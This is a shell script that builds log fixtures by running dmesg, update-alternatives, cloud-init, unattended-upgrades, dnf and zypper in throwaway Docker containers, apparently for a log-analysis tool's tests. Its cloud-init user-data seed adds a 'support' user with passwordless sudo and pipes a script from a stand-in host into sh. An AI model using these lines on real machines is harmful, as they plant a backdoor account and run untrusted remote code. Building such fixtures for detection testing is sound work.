#!/bin/sh
# Builds the small log fixtures for the kernel ring buffer, cloud-init, alternatives,
# unattended-upgrades, dnf and zypper artifacts with the real tools in throwaway containers:
#   sh test_files/applogs/build.sh
# Needs Docker and network access. Output goes next to this script, one folder per tool.
set -eu
out="$(cd "$(dirname "$0")" && pwd)"
run() { docker run --rm --platform linux/arm64 "$@"; }

# Kernel ring buffer in the forms `dmesg` prints (privileged: reading it needs the capability).
mkdir -p "$out/dmesg"
run --privileged debian:12 sh -c '
  dmesg | head -25; echo ===; dmesg -T | head -25; echo ===; dmesg -x | head -25; echo ===; dmesg -r | head -25' > "$out/dmesg/all.txt"

# update-alternatives log.
mkdir -p "$out/alternatives"
run debian:12 sh -c '
  update-alternatives --install /usr/local/bin/nxc-tool nxc-tool /bin/true 50 >/dev/null
  update-alternatives --install /usr/local/bin/nxc-tool nxc-tool /bin/false 60 --slave /usr/local/share/man/nxc.1 nxc.1 /bin/true >/dev/null
  update-alternatives --set nxc-tool /bin/true >/dev/null
  update-alternatives --auto nxc-tool >/dev/null
  update-alternatives --remove nxc-tool /bin/true >/dev/null
  cat /var/log/alternatives.log' > "$out/alternatives/alternatives.log"

# cloud-init: a NoCloud seed with a user-data shell script, then the init stages.
mkdir -p "$out/cloud-init"
run --privileged ubuntu:24.04 sh -c '
  apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq cloud-init >/dev/null 2>&1
  mkdir -p /var/lib/cloud/seed/nocloud /etc/cloud/cloud.cfg.d
  printf "datasource_list: [ NoCloud ]\n" > /etc/cloud/cloud.cfg.d/99-nxc.cfg
  printf "instance-id: iid-nxc-fixture\nlocal-hostname: nxc-fixture\n" > /var/lib/cloud/seed/nocloud/meta-data
  printf "#!/bin/bash\n# first boot\nuseradd -m -s /bin/bash support\necho \"support ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/90-support\ncurl -s http://203.0.113.7/x.sh | sh\n" > /var/lib/cloud/seed/nocloud/user-data
  cloud-init init --local >/dev/null 2>&1 || true
  cloud-init init >/dev/null 2>&1 || true
  cd /tmp && rm -rf ci && mkdir ci
  cp /var/log/cloud-init.log /var/log/cloud-init-output.log ci/
  cp /var/lib/cloud/instances/iid-nxc-fixture/user-data.txt ci/ 2>/dev/null || true
  cp /var/lib/cloud/instances/iid-nxc-fixture/vendor-data.txt ci/ 2>/dev/null || true
  tar -C ci -cf - .' | tar -C "$out/cloud-init" -xf -

# unattended-upgrades log.
mkdir -p "$out/unattended-upgrades"
run ubuntu:24.04 sh -c '
  apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq unattended-upgrades >/dev/null 2>&1
  unattended-upgrade --dry-run -d >/dev/null 2>&1 || true
  cat /var/log/unattended-upgrades/unattended-upgrades.log' > "$out/unattended-upgrades/unattended-upgrades.log"

# dnf debug logs.
mkdir -p "$out/dnf"
run rockylinux:9 sh -c '
  dnf -y -q install nano >/dev/null 2>&1
  cd /var/log && tar -cf - dnf.log dnf.librepo.log hawkey.log' | tar -C "$out/dnf" -xf -

# zypper logs (the image has no tar, so copy the files out of a named container).
mkdir -p "$out/zypper/zypp"
name=nxc-zypper-fixture-$$
docker run -d --platform linux/arm64 --name "$name" opensuse/leap:15.6 sleep 300 >/dev/null
docker exec "$name" sh -c 'zypper -n refresh >/dev/null 2>&1 || true; zypper -n install nano >/dev/null 2>&1 || true'
docker cp "$name:/var/log/zypper.log" "$out/zypper/zypper.log.full"
head -120 "$out/zypper/zypper.log.full" > "$out/zypper/zypper.log" && rm "$out/zypper/zypper.log.full"
docker cp "$name:/var/log/zypp/history" "$out/zypper/zypp/history"
docker rm -f "$name" >/dev/null
